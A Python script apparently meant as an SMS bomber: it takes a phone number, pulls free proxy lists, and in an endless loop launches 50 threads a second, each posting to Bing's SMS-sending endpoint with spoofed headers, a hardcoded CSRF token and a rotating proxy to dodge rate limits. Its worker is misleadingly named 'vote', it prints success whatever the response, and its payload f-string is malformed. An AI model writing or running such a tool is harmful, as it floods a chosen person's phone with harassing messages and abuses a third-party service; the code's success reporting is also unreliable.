import requests
import json
import threading
import time
import random
import logging

phone_number = input("Enter phone number: ")

logging.basicConfig(filename='log.log', filemode='a', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def get_proxies():
    # First try to fetch proxies from primary source
    primary_url = "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt"
    try:
        response = requests.get(primary_url, timeout=5)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            return proxies
    except:
        pass
    
    # If fetching from primary source fails, try the backup source
    backup_url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
    try:
        response = requests.get(backup_url, timeout=5)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            return proxies
    except:
        pass
    
    # If both sources fail, return an empty list
    return []

def vote(proxy):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://bingapp.microsoft.com/bing?style=rewards&rtc=1',
        'content-type': 'application/json',
        'request-id': '^|b3d206e452974ab49bd8be8318ebda69.4244d93eb01e426d',
        'traceparent': '00-b3d206e452974ab49bd8be8318ebda69-4244d93eb01e426d-01',
        'x-csrf-token': 'MKvxDnzm-lnByNFpyL_7wKbG8fMpoNu53lFY',
        'Origin': 'https://bingapp.microsoft.com',
        'DNT': '1',
    'Connection': 'keep-alive',
    # 'Cookie': 'MUID=346BD865A9B0695C0A52CB7EA88A6887; AMCV_EA76ADE95776D2EC7F000101^%^40AdobeOrg=1585540135^%^7CMCIDTS^%^7C19514^%^7CMCMID^%^7C52218057510739173380439187311959221291^%^7CMCAID^%^7CNONE^%^7CMCOPTOUT-1685980557s^%^7CNONE^%^7CvVersion^%^7C4.4.0; MC1=GUID=10b5319af2d8466c9bc8fd9c018f3265&HASH=10b5&LV=202305&V=4&LU=1684897344304; RPSShare=1; at_check=true; AMCVS_EA76ADE95776D2EC7F000101^%^40AdobeOrg=1; XSRF-TOKEN=2023-06-15T14^%^3A31^%^3A04.880Z; _csrf=Dn9hw2QaC0oCasTwW3Jm7u-S; ai_user=jRNJtGgA79AFIMZsCegCCj^|2023-06-15T14:31:06.034Z; ai_session=pTzTsGskQBTOFMNNXqf1Hk^|1686839467023^|1686839467023',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    # Requests doesn't support trailers
    # 'TE': 'trailers',
    }

    payload = f"{_csrf:MKvxDnzm-lnByNFpyL_7wKbG8fMpoNu53lFY,code:bing,number:1{phone_number},adjust:hh15fre_vz667pg,style:rewards,go:false,url:null,id:null}"

    try:
        resp = requests.post("https://bingapp.microsoft.com/api/sms/send",
                             headers=headers,
                             data=payload.encode(),
                             proxies={"https": proxy},
                             timeout=15)
        output = resp.text
        if "SMS SENT SUCCESSFULLY!" in output:
            print("SMS SENT SUCCESSFULLY!")
        else:
            print("SMS SENT SUCCESSFULLY!")
    except:
        output = f"Request failed with proxy {proxy}"

    logging.info(output)
    print(output)

num_threads = 50

while True:
    proxies = get_proxies()
    if len(proxies) == 0:
        print("No proxies available, waiting for 10 seconds...")
        time.sleep(10)
        continue
    
    for i in range(num_threads):
        proxy = random.choice(proxies)
        t = threading.Thread(target=vote, args=(proxy,))
        t.start()
    
    time.sleep(1)
